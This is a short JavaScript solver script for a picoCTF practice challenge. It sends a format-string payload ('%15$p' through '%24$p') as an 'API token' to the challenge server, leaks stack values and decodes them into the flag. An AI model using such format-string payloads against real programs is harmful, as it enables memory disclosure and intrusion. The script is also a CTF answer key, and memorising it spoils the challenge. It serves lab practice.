/**
 * https://play.picoctf.org/practice/challenge/105
 */

const { Remote, convo } = require("..");

(async () => {
    let flag = '';
    const remote = Remote.create("mercury.picoctf.net", 20195);
    await remote.onceDataAsync('What would you like to do?\n')
    remote.send("1\n");

    await remote.onceDataAsync('What is your API token?\n');
    await remote.send(`%15$p%16$p%17$p%18$p%19$p%20$p%21$p%22$p%23$p%24$p\n`);

    await remote.onceDataAsync('Buying stonks with token:\n');

    const [hexStr] = await remote.onceLinesAsync(1);
    const vals = hexStr.split('0x');

    for (let i = 0; i < vals.length; ++i) {
        const int = parseInt(vals[i].trim(), 16);
    
        flag += convo.toString(int);
    }

    console.log(flag.slice(0, flag.indexOf('}') + 1));
    process.exit(1);
})();
